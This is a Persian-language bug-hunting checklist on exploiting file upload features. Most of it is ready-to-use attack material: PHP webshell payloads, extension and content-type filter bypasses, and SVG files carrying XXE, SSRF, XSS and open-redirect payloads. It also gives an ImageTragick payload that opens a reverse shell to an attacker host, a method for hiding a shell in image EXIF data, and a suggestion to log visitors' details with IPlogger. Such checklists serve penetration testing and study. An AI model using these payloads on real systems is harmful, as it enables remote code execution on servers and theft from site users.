# 18.File Upload

کجا پیدا میشه

در اپلودرهای فایل, برای مثال اپلودر عکس پروفایل

چطور اکسپلویت میشه

این pdf رو بخونید ایده های زیادی داره

1- [https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf](https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf)  `0xAwali`

2- [https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf](https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf) توسط `ebrahim hegazy`

مقدار Content-Type رو تغییر بدید

```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

تغییر Content-Type اش به

```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/jpeg
```

سعی کنید موقع ارسال ریکوئست پسوند رو تغییر بدید, برای مثال در اینجا نمیتونید فایلی با پسوند php اپلود کنید, اما میتونید فایل jpg  اپلود کنید.

```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
Content-Type: application/x-php
```

ریکوئست رو به این تغییر بدید

```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

پیلود رو اپلود کنید, اما با ;GIF89a شروع کنید و فراموش نکنید که content-type رو به image/gif تغییر بدید

```
POST /images/upload/ HTTP/1.1
Host: target.com
...

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```

بایپس سنجش content-length, با استفاده از پیلود کوچک قابل بایپس هست

```php
(<?=`$_GET[x]`?>)
```

با استفاده از null byte در اسم فایل

```
file.php%00.gif
```

از پسوند دوتایی برای اپلود فایل استفاده کنید

```
file.jpg.php
```

اپلود با پسوندهای php غیرمحبوب (php4,php5,php6,phtml)

```
file.php5
```

سعی کنید پسوند فایل رو به صورت رندوم با حروف بزرگ بنویسید

```
file.pHP5
```

نکات رو مخلوط کنید!

**قابلیت اپلود**

تاثیر پسوند:

- `ASP`, `ASPX`, `PHP5`, `PHP`, `PHP3`: Webshell, RCE
- `SVG`: Stored XSS, SSRF, XXE
- `GIF`: Stored XSS, SSRF
- `CSV`: CSV injection
- `XML`: XXE
- `AVI`: LFI, SSRF
- `HTML`, `JS` : HTML injection, XSS, Open redirect
- `PNG`, `JPEG`: Pixel flood attack (DoS)
- `ZIP`: RCE via LFI, DoS
- `PDF`, `PPTX`: SSRF, BLIND XXE

بایپس بلاک لیست

- PHP → `.phtm`, `phtml`, `.phps`, `.pht`, `.php2`, `.php3`, `.php4`, `.php5`, `.shtml`, `.phar`, `.pgif`, `.inc`
- ASP → `asp`, `.aspx`, `.cer`, `.asa`
- Jsp → `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
- Coldfusion → `.cfm`, `.cfml`, `.cfc`, `.dbm`
- Using random capitalization → `.pHp`, `.pHP5`, `.PhAr`

بایپس لیست سفید

- `file.jpg.php`
- `file.php.jpg`
- `file.php.blah123jpg`
- `file.php%00.jpg`
- `file.php\x00.jpg` this can be done while uploading the file too, name it `file.phpD.jpg` and change the D (44) in hex to 00.
- `file.php%00`
- `file.php%20`
- `file.php%0d%0a.jpg`
- `file.php.....`
- `file.php/`
- `file.php.\`
- `file.php#.png`
- `file.`
- `.html`

اسیب پذیری ها

- Directory Traversal

اسم فایل رو etc/passwd/logo.png/../.. بزارید

اسم فایل رو logo.png/../../.. بزارید چون ممکنه لوگوی وب سایت رو تغییر بده

- SQL Injection

اسم فایل رو sleep(10).jpg’ بزارید

اسم فایل رو sleep(10)-- -.jpg بزارید

- Command Injection

اسم فایل رو ;sleep 10 ; بزارید

- SSRF

با سو استفاده اپلود از URL, اگر این تصویر در بعضی از سایت های عمومی ذخیره بشه, میتونید یک URL از [IPlogger](https://iplogger.org/invisible/) رو وارد کنید و اطلاعات هر بازدید کننده رو به سرقت ببرید.

اسیب پذیری SSRF از طریق فایل svg.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
```

- ImageTragick

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```

- XXE

با استفاده از فایل svg. اپلود کنید

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="40" x="0" y="16">&xxe;</text>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
    <image xlink:href="expect://ls"></image>
</svg>
```

استفاده از فایل اکسل

- XSS

اسم فایل رو بزارید

```jsx
filename="svg onload=alert(document.domain)>",
filename="58832_300x300.jpg<svg onload=confirm()>"
```

با استفاده از فایل gif. اپلود کنید

```jsx
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
```

با استفاده از فایل svg. اپلود کنید

```jsx
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

```jsx
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      alert("HolyBugx XSS");
   </script>
</svg>
```

- Open Redirect

با استفاده از فایل svg. اپلود کنید

```jsx
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
onload="window.location='https://attacker.com'"
xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
</code>
```

- Content-is Bypass

سنجش Content-type

فایل `file.php` رو اپلود کنید و `Content-type: application/x-php` یا `Content-Type : application/octet-stream` رو به `Content-type: image/png` یا `Content-type: image/gif` یا `Content-type: image/jpg` تغییر بدید

سنجش Content-Length

شل PHP کوچک

```php
(<?=`$_GET[x]`?>)
```

اگر محتویات پکت رو بررسی میکنند, قبل شل کدتون متن ;GIF89a رو اضافه کنید.(`Content-type: image/gif`)

```php
GIF89a; <?php system($_GET['cmd']); ?>
```

- متفرقه

اپلود file.js و file.config (web.config)

حمله Pixel flood با استفاده از عکس

حمله DoS با اسم های بزرگ:

1234..99.png

اسیب پذیری Zip Slip

اگر سایتی فایل zip. قبول میکنه, php. رو zip کنید و اپلود کنید. حالا به

site.com/path?page=zip://path/file.zip#rce.php

برید

Image Shell

ابزار Exiftool برای مشاهده و دستکاری داده های exif عالی هست. اسم فایل `mv pic.jpg pic.php.jpg` رو تغییر میدیم

```php
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
```